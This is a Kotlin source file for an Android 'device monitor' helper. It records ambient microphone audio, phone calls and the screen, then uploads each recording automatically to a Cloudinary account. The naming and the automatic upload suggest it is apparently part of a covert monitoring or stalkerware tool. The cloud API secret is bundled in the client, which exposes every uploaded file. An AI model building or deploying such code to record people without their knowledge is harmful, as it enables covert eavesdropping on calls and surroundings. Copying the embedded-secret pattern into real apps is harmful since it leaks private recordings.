package com.devicemonitor.utils

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.content.ContextCompat
import com.cloudinary.Cloudinary
import com.cloudinary.utils.ObjectUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

data class RecordingSession(
    val id: String = UUID.randomUUID().toString(),
    val startTime: Long = System.currentTimeMillis(),
    var pausedTime: Long = 0,
    var totalPausedDuration: Long = 0,
    var file: File? = null,
    var cloudinaryUrl: String? = null,
    var publicId: String? = null
)

class RecordingHelper(private val context: Context) {

    private var mediaRecorder: MediaRecorder? = null
    private var currentSession: RecordingSession? = null
    private var isPaused = false
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaProjection: MediaProjection? = null

    companion object {
        const val MAX_RECORDING_SECONDS = 18000L // 5 hours
        const val HIGH_QUALITY_SAMPLE_RATE = 44100
        const val HIGH_QUALITY_ENCODING_BIT_RATE = 192000
    }

    suspend fun startAmbientRecording(): File? = withContext(Dispatchers.IO) {
        if (!hasAudioPermission()) {
            return@withContext null
        }
        return@withContext startRecording(MediaRecorder.AudioSource.MIC, "ambient")
    }

    suspend fun startCallRecording(): File? = withContext(Dispatchers.IO) {
        if (!hasAudioPermission()) {
            return@withContext null
        }
        // Note: VOICE_CALL may require root on some devices, try VOICE_COMMUNICATION as fallback
        val audioSource = try {
            MediaRecorder.AudioSource.VOICE_CALL
        } catch (e: Exception) {
            MediaRecorder.AudioSource.VOICE_COMMUNICATION
        }
        return@withContext startRecording(audioSource, "call")
    }

    suspend fun startScreenRecording(resultCode: Int, data: Intent): File? = withContext(Dispatchers.IO) {
        try {
            val projectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, data) ?: return@withContext null

            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                context.display?.getRealMetrics(metrics)
            } else {
                @Suppress("DEPRECATION")
                windowManager.defaultDisplay.getRealMetrics(metrics)
            }
            val screenWidth = metrics.widthPixels
            val screenHeight = metrics.heightPixels
            val screenDensity = metrics.densityDpi

            val outputDir = context.getExternalFilesDir(null) ?: return@withContext null
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val outputFile = File(outputDir, "screen_${timestamp}.mp4")

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            mediaRecorder?.apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(screenWidth, screenHeight)
                setVideoFrameRate(30)
                setVideoEncodingBitRate(5 * 1024 * 1024) // 5Mbps
                setOutputFile(outputFile.absolutePath)
                prepare()
            }

            val surface = mediaRecorder?.surface
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenRecording",
                screenWidth,
                screenHeight,
                screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                surface,
                null,
                null
            )

            mediaRecorder?.start()
            currentSession = RecordingSession(file = outputFile)
            isPaused = false

            return@withContext outputFile
        } catch (e: Exception) {
            e.printStackTrace()
            return@withContext null
        }
    }

    private suspend fun startRecording(audioSource: Int, prefix: String): File? {
        try {
            val outputDir = context.getExternalFilesDir(null) ?: return null
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val outputFile = File(outputDir, "${prefix}_${timestamp}.m4a")

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            mediaRecorder?.apply {
                setAudioSource(audioSource)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(HIGH_QUALITY_ENCODING_BIT_RATE)
                setAudioSamplingRate(HIGH_QUALITY_SAMPLE_RATE)
                setAudioChannels(2)
                setOutputFile(outputFile.absolutePath)
                prepare()
                start()
            }

            currentSession = RecordingSession(file = outputFile)
            isPaused = false

            return outputFile
        } catch (e: Exception) {
            e.printStackTrace()
            return null
        }
    }

    suspend fun pauseRecording() = withContext(Dispatchers.IO) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && !isPaused && currentSession != null) {
            try {
                mediaRecorder?.pause()
                isPaused = true
                currentSession?.pausedTime = System.currentTimeMillis()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    suspend fun resumeRecording() = withContext(Dispatchers.IO) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && isPaused && currentSession != null) {
            try {
                mediaRecorder?.resume()
                currentSession?.let {
                    it.totalPausedDuration += System.currentTimeMillis() - it.pausedTime
                }
                isPaused = false
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    suspend fun stopRecording(): Pair<String?, String?> = withContext(Dispatchers.IO) {
        val session = currentSession ?: return@withContext Pair(null, null)
        try {
            mediaRecorder?.apply {
                try {
                    stop()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                release()
            }
            mediaRecorder = null
            
            virtualDisplay?.release()
            virtualDisplay = null
            mediaProjection?.stop()
            mediaProjection = null

            isPaused = false

            // Upload to Cloudinary
            val (cloudinaryUrl, publicId) = session.file?.let { uploadToCloudinary(it) } ?: Pair(null, null)
            session.cloudinaryUrl = cloudinaryUrl
            session.publicId = publicId

            return@withContext Pair(cloudinaryUrl, publicId)
        } catch (e: Exception) {
            e.printStackTrace()
            return@withContext Pair(null, null)
        } finally {
            currentSession = null
        }
    }

    fun getRecordingProgressSeconds(): Long {
        val session = currentSession ?: return 0L
        val elapsed = if (isPaused) {
            session.pausedTime - session.startTime - session.totalPausedDuration
        } else {
            System.currentTimeMillis() - session.startTime - session.totalPausedDuration
        }
        return elapsed / 1000L
    }

    fun isRecording(): Boolean = currentSession != null && !isPaused
    fun isPaused(): Boolean = isPaused

    private fun hasAudioPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
    }

    private suspend fun uploadToCloudinary(file: File): Pair<String?, String?> = withContext(Dispatchers.IO) {
        try {
            val cloudinary = Cloudinary(ObjectUtils.asMap(
                "cloud_name", Constants.CLOUDINARY_CLOUD_NAME,
                "api_key", Constants.CLOUDINARY_API_KEY,
                "api_secret", Constants.CLOUDINARY_API_SECRET
            ))
            val uploadResult = cloudinary.uploader().upload(file, ObjectUtils.asMap("resource_type", "video"))
            return@withContext Pair(
                uploadResult["secure_url"] as? String,
                uploadResult["public_id"] as? String
            )
        } catch (e: Exception) {
            e.printStackTrace()
            return@withContext Pair(null, null)
        }
    }
}
